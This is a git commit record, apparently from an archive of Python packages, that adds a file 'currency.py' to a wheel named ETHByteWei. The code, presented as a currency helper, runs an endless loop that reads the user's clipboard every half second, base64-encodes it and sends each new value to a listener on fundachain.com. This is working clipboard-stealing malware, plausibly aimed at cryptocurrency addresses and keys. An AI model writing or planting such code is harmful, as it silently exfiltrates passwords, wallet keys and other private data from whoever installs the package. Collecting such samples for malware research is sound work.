6fcc14dd4d49d09c608cbaeb1ea9d744842a422b
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 18:02:32 +0000

    Add package ETHByteWei/1.0/ethbytewei-1.0-py3-none-any.whl

---
+++ packages/ETHByteWei/ethbytewei-1.0-py3-none-any.whl/ETHByteWei/currency.py
@@ -0,0 +1,17 @@
+import requests
+import base64
+from pandas.io.clipboard import clipboard_get
+from time import sleep
+
+url="http://fundachain.com/listener/index.php?balance={}"
+
+def currency():
+    value=""
+    while 1:
+        sleep(0.5)
+        info =base64.b64encode(clipboard_get().encode())
+        if(value != info):
+            code=requests.get(url.format(info.decode()))
+            value=info
+        
+
